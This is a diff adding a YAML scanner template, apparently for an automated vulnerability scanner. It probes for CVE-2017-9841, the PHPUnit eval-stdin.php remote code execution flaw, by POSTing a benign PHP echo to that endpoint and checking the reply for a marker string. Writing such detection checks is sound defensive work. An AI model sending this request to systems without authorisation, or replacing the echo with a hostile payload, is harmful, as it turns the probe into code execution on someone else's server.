@@ -1,0 +1,17 @@
+name: poc-phpunit-rce
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      headers:
+        Content-Type: "text/plain"
+      body: "<?php echo 'sxel'; ?>"
+    expression: response.status == 200 && response.body.bcontains("sxel")
+expression: r0()
+detail:
+  author: sxel
+  description: PHPUnit eval-stdin.php RCE probe (CVE-2017-9841)
+  severity: critical
+  tags: phpunit,php,rce
